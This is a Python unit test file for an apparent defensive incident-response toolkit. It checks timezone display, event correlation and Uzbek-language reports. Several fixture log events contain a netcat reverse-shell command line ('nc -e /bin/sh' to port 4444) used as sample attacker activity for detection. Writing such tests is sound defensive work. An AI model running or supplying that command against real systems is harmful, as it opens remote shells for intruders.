import unittest
import os
import subprocess
import json
from bluekit.ir.correlator import extract_canonical, correlate_incident
from bluekit.ir.report import render_markdown_report, build_incident_model

class TestTzDisplayIr(unittest.TestCase):
    def test_extract_canonical_with_tz(self):
        c = extract_canonical({'@timestamp': '2026-10-05T08:00:00Z', 'host': {'name': 'WS1'}})
        self.assertEqual(c.get('timestamp_display'), '2026-10-05 08:00:00 UTC (Toshkent 13:00:00)')
        self.assertTrue(c.get('timestamp', '').startswith('2026-10-05T13:00:00+05:00'))

    def test_extract_canonical_naive(self):
        c = extract_canonical({'@timestamp': '2026-10-05 13:00:00', 'host': {'name': 'WS2'}})
        self.assertEqual(c.get('timestamp_display'), '2026-10-05 13:00:00')

    def test_ir_chain_stages(self):
        events = [
            {'@timestamp': '2026-10-05T08:00:00Z', 'host': 'WS1', 'process': {'command_line': 'whoami'}},
            {'@timestamp': '2026-10-05T08:05:00Z', 'host': 'WS1', 'process': {'command_line': 'nc -e /bin/sh 1.2.3.4 4444'}, 'user': 'root'}
        ]
        chain = correlate_incident(events)
        self.assertGreater(len(chain.stages), 0)
        self.assertTrue(all(bool(s.timestamp_display) for s in chain.stages))

    def test_uz_markdown_report(self):
        events = [
            {'@timestamp': '2026-10-05T08:00:00Z', 'host': 'WS1', 'process': {'command_line': 'whoami'}, 'destination': {'ip': '1.1.1.1'}},
            {'@timestamp': '2026-10-05T08:05:00Z', 'host': 'WS1', 'process': {'command_line': 'nc -e /bin/sh 1.1.1.1 4444'}, 'destination': {'ip': '1.1.1.1', 'port': '4444'}}
        ]
        chain = correlate_incident(events)
        model = build_incident_model(chain, 'test', 1)
        model.all_iocs.append({"value": "1.1.1.1", "type": "ip", "role": "c2", "description": ""})
        rep = render_markdown_report(model, 'uz')
        self.assertIn('vaqtlar logdagi kabi', rep)
        self.assertIn('2026-10-05 08:00:00 UTC', rep)
        
    def test_bk_ir_chain_e2e(self):
        project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        temp_file = os.path.join(project_dir, 'temp_ir_test.json')
        with open(temp_file, 'w') as f:
            json.dump([
                {"@timestamp": "2026-10-05T08:00:00Z", "host": {"name": "WS1"}, "user": {"name": "root"}, "process": {"command_line": "whoami"}},
                {"@timestamp": "2026-10-05T08:05:00Z", "host": {"name": "WS1"}, "user": {"name": "root"}, "process": {"command_line": "nc -e /bin/sh 1.1.1.1 4444"}}
            ], f)
        
        bk_py = os.path.join(project_dir, 'bk.py')
        res = subprocess.run(['python', bk_py, 'ir', 'chain', temp_file], capture_output=True, text=True)
        os.remove(temp_file)
        
        out = res.stdout
        self.assertIn('Vaqt (logdagi)', out)
        self.assertIn('UTC (Toshkent ', out)
        self.assertIn('08:00:00', out)

if __name__ == '__main__':
    unittest.main()
